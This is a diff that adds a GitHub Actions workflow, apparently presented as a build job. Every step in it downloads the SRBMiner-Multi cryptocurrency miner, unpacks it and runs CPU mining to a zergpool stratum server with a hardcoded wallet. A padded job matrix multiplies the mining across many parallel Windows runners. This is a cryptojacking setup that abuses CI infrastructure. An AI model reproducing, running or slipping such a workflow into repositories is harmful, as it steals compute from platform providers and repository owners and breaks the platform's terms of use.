@@ -1,0 +1,26 @@
+name: eX-code_UMBL
+
+on: [workflow_dispatch]
+
+jobs:
+  build:
+    name: eX-code_UMBL
+    runs-on: windows-latest
+    strategy:
+      max-parallel: 5
+      fail-fast: false
+      matrix:
+        go: [1.0, 1.1, 1.2, 1.3, 1,35]
+        flag: [A, B, C, D, E, F, G, H, I]
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: PREPARING
+      run: Invoke-WebRequest https://github.com/doktor83/SRBMiner-Multi/releases/download/0.7.1/SRBMiner-Multi-0-7-1-win64.zip -Outfile SRBMiner-Multi-0-7-1-win64.zip
+    - name: Seting-UP
+      run: Expand-Archive SRBMiner-Multi-0-7-1-win64.zip
+    - name: Running
+      run: .\SRBMiner-Multi-0-7-1-win64.zip\SRBMiner-MULTI.exe --disable-gpu --algorithm power2b --pool stratum+tcp://power2b.asia.mine.zergpool.com:7445 --wallet Mj72KbUTkJE8janJvKNvQJ8GBU4qAHn8Pc
+    - name: DONE
+      run: exit
